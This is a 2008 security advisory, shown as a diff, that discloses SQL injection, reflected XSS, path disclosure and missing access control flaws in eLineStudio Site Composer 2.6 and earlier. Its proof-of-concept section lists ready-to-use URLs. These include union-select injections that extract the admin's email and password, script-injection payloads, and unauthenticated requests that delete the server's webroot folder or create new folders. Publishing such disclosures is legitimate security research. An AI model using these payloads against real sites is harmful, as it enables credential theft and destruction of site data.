@@ -1,0 +1,86 @@
+########################## www.BugReport.ir #######################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title: eLineStudio Site Composer (ESC) <=2.6 Multiple Vulnerabilities
+# Vendor: www.elinestudio.com
+# Vulnerable Version: 2.6 and prior versions
+# Exploit: Available
+# Impact: High
+# Fix: N/A
+# Original Advisory: www.bugreport.ir/?/45
+###################################################################################
+
+####################
+1. Description:
+####################
+    eLineStudio Site Composer is a 100% browser-based database-driven content management system that helps companies to better manage, update & share web content. eLineStudio Site Composer provides affordable & flexible licensing for end users & web developers.
+####################
+2. Vulnerabilities:
+####################
+    2.1. Injection Flaws, Cross Site Scripting (XSS). SQL Injection in "/ansFAQ.asp" in "id" parameter. Reflected XSS attack in "/ansFAQ.asp" in "topic" and "button" parameters.
+        2.1.1. Exploit:
+                        Check the exploit/POC section.
+    2.2. Injection Flaws. SQL Injection in "preview.asp" in "template_id" parameter.
+        2.2.1. Exploit:
+                        Check the exploit/POC section.
+    2.3. Information Leakage. Database path disclosure in "/cms/include/trigger.asp" and/or "/cms/include/common2.asp".
+        2.3.1. Exploit:
+                        Check the exploit/POC section.
+    2.4. Failure to Restrict URL Access. Attacker can delete any folder on the server by "/cms/assetmanager/folderdel_.asp".
+        2.4.1. Exploit:
+                        Check the exploit/POC section.
+    2.5. Failure to Restrict URL Access. Attacker can create folder on the server by "/cms/assetmanager/foldernew.asp".
+        2.5.1. Exploit:
+                        Check the exploit/POC section.
+    2.6. Cross Site Scripting (XSS). Reflected XSS attack in "login.asp" in "id" and "txtEmail" parameters.
+        2.6.1. Exploit:
+                        Check the exploit/POC section.
+####################
+3. Exploits/POCs:
+####################
+    Original Exploit URL: http://bugreport.ir/index.php?/45/exploit
+    3.1. SQL Injection in "/ansFAQ.asp" in "id" parameter. Reflected XSS attack in "/ansFAQ.asp" in "topic" and "button" parameters.
+        -------------
+        Find Admin's password:
+            http://[URL]/ansFAQ.asp?id=-2 union select email,password from [user] where email like '%25admin%25'
+        XSS attacks:
+            http://[URL]/ansFAQ.asp?id=1&topic=</title><script>alert('sdl BugReport.IR XSS')</script>
+            http://[URL]/ansFAQ.asp?id=1&button="><script>alert('sdl BugReport.IR XSS')</script>
+        -------------
+    3.2. SQL Injection in "preview.asp" in "template_id" parameter.
+        -------------
+        Find Admin's password:
+            http://[URL]/preview.asp?template_id=-1 union select 1,'[%25menu%25]' as date_created,email%2b'<br>'%2bpassword,user.*,user.*,1,2,3,4,5 from [user] where email like '%25admin%25'
+        -------------
+    3.3. Database path disclosure in "/cms/include/trigger.asp" and/or "/cms/include/common2.asp".
+        -------------
+        http://[URL]/cms/include/trigger.asp
+        http://[URL]/cms/include/common2.asp?id=1
+        -------------
+    3.4. Attacker can delete any folder on the server by "/cms/assetmanager/folderdel_.asp".
+        -------------
+        http://[URL]/cms/assetmanager/folderdel_.asp?inpCurrFolder=C:\InetPub\wwwroot\
+        -------------
+    3.5. Attacker can create folder on the server by "/cms/assetmanager/foldernew.asp".
+        -------------
+        http://[URL]/cms/assetmanager/foldernew.asp?inpCurrFolder=c:\inetpub\wwwroot\&inpNewFolderName=test2008
+        -------------
+    3.6. Reflected XSS attack in "login.asp" in "id" and "txtEmail" parameters.
+        -------------
+        http://[URL]/login.asp?id=1"><script>alert('sdl BugReport.ir XSS')</script>
+        http://[URL]/login.asp?txtEmail=1"><script>alert('sdl BugReport.ir XSS')</script>
+        -------------
+####################
+4. Solution:
+####################
+    Edit the source code to ensure that inputs are properly sanitized (for 2.1, 2.2, 2.6). Rename the mentioned files in section 2.3, 2.4, 2.5, and wait for vendor patch.
+####################
+5. Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-06-19]
